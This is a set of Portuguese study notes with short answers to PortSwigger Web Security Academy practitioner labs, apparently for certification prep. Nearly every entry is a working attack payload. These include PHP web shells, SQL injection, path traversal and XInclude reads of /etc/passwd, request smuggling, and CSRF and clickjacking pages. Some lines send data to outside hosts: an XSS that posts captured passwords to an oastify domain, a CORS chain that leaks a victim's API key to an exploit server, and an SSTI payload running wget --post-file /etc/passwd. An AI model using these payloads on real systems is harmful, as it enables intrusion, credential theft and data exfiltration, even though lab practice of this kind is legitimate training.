# Practitioner Labs

A PortSwigger recomenda resolver todos [esses 23 laboratórios](https://portswigger.net/web-security/certification/how-to-prepare/practitioner-labs-prep-step-one) como parte dos estudos.

A grande parte dos laboratórios tem somente a resposta sem nenhum detalhe já que todos eles aparecem em alguma etapa, nos outros arquivos.

<br>

## Laboratórios

**Lab: Web Shell Upload via Extension Blacklist Bypass**

Suba um arquivo com extensão `.phar`.
```
<?php echo file_get_contents('/home/carlos/secret'); ?>

OU

<?php system($_GET['cmd']); ?>
```

<br>
<br>

**Lab: OAuth Account Hijacking via redirect_uri**

Mude o `redirect_uri` para o servidor de exploit.

O CSRF será:
```
<iframe src="https://oauth-0a64002304635a12826490d402450089.oauth-server.net/auth?client_id=b6ajkjihwmqj6pxjov0z8&redirect_uri=https://exploit-0ad100fa040b5a2c82f7918c01ce0085.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Utilize o token capturado para logar em:
```
https://your-lab-id.web-security-academy.net/oauth-callback?code=CODE
```

<br>
<br>

Lab: SSRF via Flawed Request Pparsing

Observe que é possível acessar a página home colocando a URL absoluta no path da request:
```
GET https://YOUR-LAB-ID.web-security-academy.net/
```

Utilize isso para enumerar hosts internos com Intruder:
```
Host: 192.168.0.1
```

Delete o usuário pegando o CSRF válido através da resposta ao acessar `/admin`.
```
POST https://0ab900100391b39c8158079300f000f7.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.192
...

csrf=JH6ksOFcMTuCx83COSNSuiPlzSYJD55d&username=carlos
```

<br>
<br>

**Lab: SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft**
```
Gifts'+UNION+SELECT+NULL,NULL#

Gifts'+UNION+SELECT+NULL,@@version#
```

<br>
<br>

**Lab: Exploiting cross-site scripting to capture passwords**
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://4x28nlhnbd0yv9of913vlou6cxio6gu5.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

<br>
<br>

**Lab: CSRF Where Token Validation Depends on Request Method**

Se não funcionar, substituta o `%40` por `@`.
```
<form action="https://0a33008204e8a86381bb0c1e004700be.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

<br>
<br>

**Lab: Blind XXE with Out-of-Band Interaction via XML Parameter Entities**
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

<br>
<br>

**Lab: Multistep Clickjacking**
```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

<br>
<br>

**Lab: SSRF with Filter Bypass via Open Redirection Vulnerability**

Open Redirection está em:
```
https://0af200a003bdc068859abe6100db00ec.web-security-academy.net/product/nextProduct?currentProductId=2&path=https://0af200a003bdc068859abe6100db00ec.web-security-academy.net
```

SSRF:
```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

<br>
<br>

**Lab: CORS vulnerability with Trusted Insecure Protocols**

1. Revise o hisórico e observe que a chave é obtida através de uma requisição AJAX para /accountDetails e a resposta contém o header `Access-Control-Allow-Credentials`.
2. Envie a request para o Repeater e adicione o header `Origin: http://subdomain.lab-id` onde o `lab-id` é o domínio do laboratório.
3. Observe que o origin é refletido em `Access-Control-Allow-Origin`, confirmando que o CORS aceita o acesso desses subdomínios.
4. Aba a página de produto, click em **Check stock** e observe que uma página com um subdomíno é carregada.
5. Observe que o parâmetro `productId` é vulnerável à XSS.
6. Use o seguinte payload para obter a chave de API da vítima:
```html
<script>
document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

<br>
<br>

**Lab: Exploiting HTTP Request Smuggling to Deliver Reflected XSS**
```
POST / HTTP/1.1
Host: 0a5800fa04974f1bc15f0dab004400ef.web-security-academy.net
Cookie: session=3MNdX218m6gxqn82BLl4dxpx3eCLNd8i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Transfer-Encoding: chunked

3
x=y
0

GET /post?postId=10 HTTP/1.1
User-Agent: kek"><img src=123 onerror=alert(1)>
Foo: x
```

<br>
<br>

**Lab: Server-Side Template Injection in an Unknown Language with a Documented Exploit**

Identifique o SSTI no parâmetro da URL.
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Versão adaptada:
```
{this.push "return require('child_process').exec('wget --post-file /etc/passwd https://0qrgfsgr10mpp8uawojbyfam7dd41vsjh.oastify.com');"}}
```

<br>
<br>

**Lab: Using Application Functionality to Exploit Insecure Deserialization**

Delete o usuário adicional para estudar as requisições.

Na request `POST /my-account/delete`, altere o cookie serializado para:
```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"upjgj8nlrqjsi09uqh41pflrceoig0lx";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

<br>
<br>

**Lab: File Path Traversal, Traversal Sequences Stripped Non-Recursively**
```
GET /image?filename=....//....//....//etc//passwd

Ou

/image?filename=..././..././..././etc/passwd
```

**Lab: Multi-Step Process with no Access Control on One Step**

O step 2 não está autenticado com privilégios de administrador.

<br>
<br>

**Lab: Broken Brute-Force Protection, IP Block**

Coloque credenciais válidas entre cada duas tentativas de brute-force para bypassar a proteção.

<br>
<br>

**Lab: Insufficient Workflow Validation**

Confirma como um checkout normal funciona:
```
GET /cart/order-confirmation?order-confirmed=true
```

Proceda com o processo de comprar uma jaqueta, mas mude a segunda request para a que está acima.

<br>
<br>

**Lab: Manipulating the WebSocket Handshake to Exploit Vulnerabilities**
```
<img src=1 oNeRrOr=alert`1`>
```

<br>
<br>

**Lab: DOM XSS Using Web Messages and a JavaScript URL**

Código-fonte:
```
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

Exploit:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

<br>
<br>

**Lab: Web Cache Poisoning with Multiple Headers**

Use a extensão Param Miner para identificar o header `X-Forwarded-Scheme`. Qualquer outro valor diferente de HTTPS vai retornar status 302 com um header `Location`.

Use esse header com o header `X-Forwarded-Host` para redirecionar o usuário para seu exploit server.
```
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0ab300bf03adb37181e4d360010c007b.exploit-server.net
```

Nota: você precisa envenenar o arquivo `/resources/js/tracking.js` e não a página home `/`.

<br>
<br>

**Lab: Information Disclosure in Version Control History**
```
git-dumper https://0a3200d504033dce82e5f7a100de0017.web-security-academy.net/.git .

git log --stat
 
git show 8d7bd37bfe266c9d948e8bfea4e04ef8397a558d
```


<br>
<br>

**Lab: Blind OS Command Injection with Output Redirection**

Tem um diretório passível de escrita em `/var/www/images/`.
```
||+whoami+>+/var/www/images/whoami.txt||
```

Acesse o arquivo em: `/image?filename=whoami.txt`.

<br>

**Lab: Discovering Vulnerabilities Quickly with Targeted Scanning**

Utilize o Active Scan em `POST /produck/stock`.

Isso vai identificar a injeção XML, então copie o comando e adapte para ler o arquivo `/etc/passwd`.
```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
